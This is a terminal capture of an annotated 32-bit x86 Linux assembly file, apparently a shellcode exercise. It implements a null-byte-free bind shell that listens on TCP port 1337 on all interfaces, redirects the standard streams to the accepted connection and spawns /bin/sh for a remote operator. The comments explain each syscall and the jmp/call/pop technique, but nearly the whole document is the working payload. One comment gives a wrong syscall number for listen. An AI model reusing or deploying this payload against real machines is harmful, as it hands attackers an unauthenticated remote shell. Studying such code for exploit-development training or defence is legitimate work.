t@kali:~/Documents/SHELLCODE# cat portbind_tcp.asm 
; Author: @bugsam
; Date: 10/10/2020
; Description: creates a peer application to communicates with a peer socket and returns a command shell.
; Reference:
;			[1] linux/net.h
;			[2] i386-linux-gnu/asm/unistd_32.h
;			[3] i386-linux-gnu/sys/socket.h
;			[4] linux/in.h
;			[5] i386-linux-gnu/bits/socket_type.h
;			[6] i386-linux-gnu/bits/socket.h
;			[7] listen(2)

global _start

_start:
	
	; As defined in [7], to establish a tunnel to communicate, four steps are required:
	; 0x00 - creates a nameless socket with SYS_SOCKET;
	; 0x01 - bounds the socket to a local address with SYS_BIND;
	; 0x02 - opens the socket for incoming connections with SYS_LISTEN;
	; 0x03 - accepts connection from rx_queue with SYS_ACCEPT.
	
	; 0x00 - SYS_SOCKET as defined in [3], receives three arguments in its constructor,
	; first (domain) responsible for the protocol family to be used, second (type)
	; which waits for the communication semantics, the last (protocol) specifies a protocol
	; to be used with the socket.
	
	xor edx, edx 		; (EDX) *args[2] protocol <- 0x00 (IPPROTO_IP) as defined in [4]
	mov cl, 0x01		; (ECX) *args[1] type <- 0x01 (SOCK_STREAM [TCP]) as defined in [5]
	xor ebx, ebx
	mov bl, 0x02		; (EBX) *args[0] domain <- 0x02 (AF_INET) as defined in [6]
	xor eax, eax
	mov ax, 0x167		; 0x167 (SYS_SOCKET) as defined in [2]
	int 0x80		; on success returns (EAX <- sockdfd)

	; 0x01 - SYS_BIND is built with three arguments, (sockfd) which is a file descriptor to the socket, 
	; the (addr) address for the sockaddr_in structure, and (addr_len), which specifies how much bytes the
	; structure has. The sockaddr_in is defined in [4], it has three mandatory values, first the protocol 
	; family (sa_family), then we have in network byte order (sin_port) a 16-bit value to the port number
	;  and (s_addr) a 32-bit value to the ip address
	
	push edx		; s_addr <- 0x00 (listen on all interfaces)
	mov dx, 0x3905		; sin_port <- 0x3905 (1337)
        shl edx, 0x10           ; shift 16 bits (avoids NULL-byte)
	mov dl, 0x02		; sin_family <- 0x02 (AF_INET) as defined in [6]
        push edx                ; 0x39050002 (sin_port,sa_family)
	mov ecx, esp		; ECX -> *struct sockaddr_in
	
	push 0x10		; (EDX) args[2] addrlen 0x10 (SOCK_SIZE) default defined in [4]
	pop edx
				; (ECX) args[1] *addr -> *struct sockaddr_in
	xchg ebx, eax		; (EBX) args[0] sockfd
	mov ax, 0x169		; 0x169	(SYS_BIND) as defined in [2]
	int 0x80		; on success returns (EAX <- 0)
	

	; 0x02 - SYS_LISTEN is created with just two argumenst, first is the socket file descriptor (sockfd),
	; then (backlog) is a queue length for completely established sockets waiting to be accepted.

	mov ecx, ebx 		; (ECX) args[1] backlog
				; (EBX) args[0] sockfd
	mov ax, 0x16b		; 0xc9 (SYS_LISTEN)
	int 0x80		; on success returns (EAX <- 0)
	
	
	; 0x03 - SYS_ACCEPT constructure is built with a socket file descriptor (sockfd) that has been created
	; with socket() than bound to a local address with bind() and is listeing for incoming connections with
	; listen(). Not only (addr) and (addr_len) can be NULL but also (flags).

	xor esi, esi 		; (ESI) flags
	xor edx, edx		; (EDX) args[2] addrlen 
	xor ecx, ecx		; (ECX) args[1] *addr -> *struct sockaddr_in
				; (EBX) args[0] sockfd	
	mov ax, 0x16c		; 0x16c (SYS_ACCEPT) as defined in [2]
	int 0x80		; on success returns (EAX <- new sockfd)

	; The SYS_dup2 receives two file descriptor as arguments, the (oldfd) and (newfd).
        ; /* Duplicate FD to FD2, closing FD2 and making it open on the same file.  */
        ; extern int dup2 (int __fd, int __fd2) __THROW;
	; What it does is, creates a copy of the new file descriptor created 
	; (returned by accept()) which represents the establishd communication channel,
	; with the three standard streams, so when a command shell is spawned the basic 
	; I/O and ERR operations can be redirect to the remote operator.
	; this works nice and subtle because by default, file descriptors remain open 
	; across an execve().

	xor ecx, ecx
	mov cl, 0x2		; loop through SYS_STDERR, SYS_STDOUT, SYS_STDIN
        mov ebx, eax            ; newfd <- SYS_ACCEPT() returns
loop:
	push ecx 		; (ECX) newfd <- SYS_SOCKET() created
				; (EBX) oldfd <- SYS_ACCEPT() returns
        xor eax, eax
        mov al, 0x3f            ; 0x3f (SYS_dup2) as defined in [2]
        int 0x80                ; (w/out ERROR returns EAX <- new file descriptor)
	pop ecx
	dec ecx
	jnl loop 		; when jump short if not less
	
        jmp short get_bash 	; jump short (EB), will jump to a memory address, 
                                ; in jump short, the relative  address is 8-bit value. 
                                ; For a forward jump, when the relative address is positve, 
                                ; it will result a memory address greather than the current EIP:
                                ; EIP + 1-byte (opcode EB) + 1-byte (relative address) + rel8 = next_instruction
                                ; ex: 8049000: eb 1c 
                                ; 0849000 + 1 + 1 + 1c = 0804901E (next intruction)

                                ; For a reverse jump, when the relative address is negative,
                                ; it will result a memory address less than the current EIP,
                                ; the relative number is a signed number and might be stored in
                                ; little endian:
                                ; EIP + 1-byte (opcode EB) + 1-byte (relative address) - (rel8_two's_complement) = next_instruction
                                ; ex: 8049011: eb ed
                                ; NOT(1110 1101) = 0001 0010 + 1 = 13h
                                ; NOT(ed) + 1 = 13h (rel8_two's_complement)
                                ; 08049011 + 2 + 13h = 08049000 (next intruction)

execve:
        pop esi                 	; ESI <- (memory address adquired in runtime to the first 
                                        ; byte of memory that contains the respective string).
                                        ; In other words, this is the return-instruction pointer, saved by call
                                        ; instruction (E8) in the procedure stack 
        xor ebx, ebx
        lea ecx, [esi + 13]             ; ECX (argv[0]) memory address
        mov dword[esi], ecx             ; set pointer to first argument
        mov dword[esi + 4], ebx         ; set argv[1] NULL-dword
        mov byte[esi + 15], bl          ; set NULL-terminated character in string argv[0]

        lea edx, [esi + 4]              ; set *envp as NULL
        lea ecx, [esi]                  ; ECX (*argv), pointer to *argv[0]
        lea ebx, [esi + 8]              ; EBX (*pathname)

        xor eax, eax
        mov al, 0xb                     ; EAX (11) syscall EXECVE
        int 0x80

get_bash:
        call execve
 					; near call (E8), will saves the return-instruction pointer on the 
                                        ; stack and changes the EIP to the value pointing to the relative address.
                                        ; The return-instruction pointer, points to the next operation that should 
                                        ; be execute when a return occurs from the called procedure.
                                        ; Perhaps the relative address is in little-endian, also it might be negative 
                                        ; if the called procedure is before the current EIP value. In a 32 bit operation
                                        ; the return-instruction pointer can be obtained:
                                        ; EIP + 1-byte (opcode E8) + 4-byte (relative address) = return_instruction_pointer
                                        ; The called procedure in forward mode can be obtained through:
                                        ; return_instruction_pointer + rel32 = next_instruction
                                        ; ex: 8049002: e8 1d 00 00 00
                                        ; 08049002 + 1 + 4 = 8049007 (return_instruction_pointer)
                                        ; 08049007 + 0000001d = 08049024 (next_instruction) 

                                        ; The called procedure in a reverse mode can be obtained through:
                                        ; return_instruction_pointer - rel32_two's_complement = next_instruction
                                        ; ex:  804906d: e8 ab ff ff ff 
                                        ; 0804906d + 1 + 4 = 08049072 (return_instruction_pointer)
                                        ; NOT(1111 1111 1111 1111 1111 1111 1010 1011) = 0101 0100 + 1 = 55h
                                        ; NOT(ffffffab) + 1 = 55h (rel32_two's_complement)
                                        ; 08049072 - 55h = 0804901d (next_instruction)

        shell: db "ZZZZNNNN/bin/shN"
                                	; pointer to: *argv[0]: "sh",0
                                	; argv[1]: NULL
                                	; *pathname: /bin/sh
